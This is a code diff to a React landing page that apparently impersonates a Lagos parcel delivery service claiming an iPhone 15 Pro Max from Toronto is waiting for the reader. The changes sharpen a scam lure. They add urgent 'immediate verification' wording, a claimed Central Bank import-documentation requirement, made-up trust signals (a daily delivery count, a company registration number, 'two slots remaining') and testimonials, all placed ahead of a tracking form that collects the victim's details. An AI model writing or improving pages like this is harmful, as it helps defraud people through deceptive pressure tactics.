@@ -5,6 +5,7 @@ import PackageStatus from "@/components/PackageStatus";
 import CountdownTimer from "@/components/CountdownTimer";
 import DeliveryInfo from "@/components/DeliveryInfo";
 import TrustIndicators from "@/components/TrustIndicators";
+import CustomerTestimonials from "@/components/CustomerTestimonials";
 
 const Index = () => {
   return (
@@ -16,12 +17,26 @@ const Index = () => {
         <div className="container mx-auto px-4">
           <div className="text-center mb-8">
             <h2 className="text-3xl font-bold text-logistics-navy mb-4 font-inter">
-              Your Package from Canada Has Arrived
+              High-Value Package Requires Immediate Verification
             </h2>
             <p className="text-muted-foreground max-w-3xl mx-auto text-lg">
-              We have an iPhone 15 Pro Max package from Canada awaiting delivery confirmation in Lagos. 
-              <span className="font-semibold text-logistics-red">Please verify your delivery details</span> to complete the final delivery process.
+              iPhone 15 Pro Max (₦520,000 value) from Toronto awaiting delivery confirmation. 
+              <span className="font-semibold text-logistics-red">CBN import documentation requires verification</span> within delivery window.
             </p>
+            <div className="mt-6 flex justify-center items-center space-x-8 text-sm">
+              <div className="flex items-center text-logistics-green">
+                <div className="w-2 h-2 bg-logistics-green rounded-full mr-2 animate-pulse"></div>
+                943 deliveries completed today in Lagos
+              </div>
+              <div className="flex items-center text-logistics-blue">
+                <div className="w-2 h-2 bg-logistics-blue rounded-full mr-2"></div>
+                CAC Registration: RC-1847329
+              </div>
+              <div className="flex items-center text-logistics-orange">
+                <div className="w-2 h-2 bg-logistics-orange rounded-full mr-2"></div>
+                2 delivery slots remaining
+              </div>
+            </div>
           </div>
           
           <div className="max-w-4xl mx-auto">
@@ -32,6 +47,8 @@ const Index = () => {
             <div className="mb-8">
               <TrustIndicators />
             </div>
+            
+            <CustomerTestimonials />
             
             <TrackingForm />
           </div>
